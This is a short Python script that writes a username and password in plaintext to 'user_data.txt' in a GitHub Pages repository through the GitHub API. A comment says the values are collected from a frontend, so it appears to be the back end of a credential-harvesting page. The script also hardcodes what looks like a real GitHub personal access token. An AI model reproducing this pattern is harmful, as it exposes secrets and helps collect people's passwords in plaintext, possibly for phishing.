import requests
import base64

# GitHub repository details
GITHUB_TOKEN = "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"  # Replace with your GitHub token
GITHUB_USERNAME = "Moonfugur"  # Replace with your GitHub username
GITHUB_REPO = "Moonfugur.github.io"  # Replace with your repository name
FILE_PATH = "user_data.txt"  # File path in the repository

def save_to_github(username, password):
    """
    Save user data to a GitHub repository.
    """
    # GitHub API URL for the file
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{FILE_PATH}"
    
    # Prepare the content to save
    content = f"Username: {username}\nPassword: {password}"
    encoded_content = base64.b64encode(content.encode()).decode()
    
    # Check if the file already exists to get its SHA
    response = requests.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
    sha = None
    if response.status_code == 200:
        sha = response.json().get("sha")
    
    # Prepare the data payload
    data = {
        "message": "Update user data",
        "content": encoded_content,
    }
    if sha:
        data["sha"] = sha  # Include the SHA if the file exists

    # Make the PUT request to create or update the file
    response = requests.put(url, json=data, headers={"Authorization": f"token {GITHUB_TOKEN}"})
    
    if response.status_code in [200, 201]:
        print("File updated successfully.")
    else:
        print("Error:", response.status_code, response.json())

# Example usage
if __name__ == "__main__":
    # Replace these with data collected from your frontend
    username = "example_user"
    password = "example_password"
    
    save_to_github(username, password)
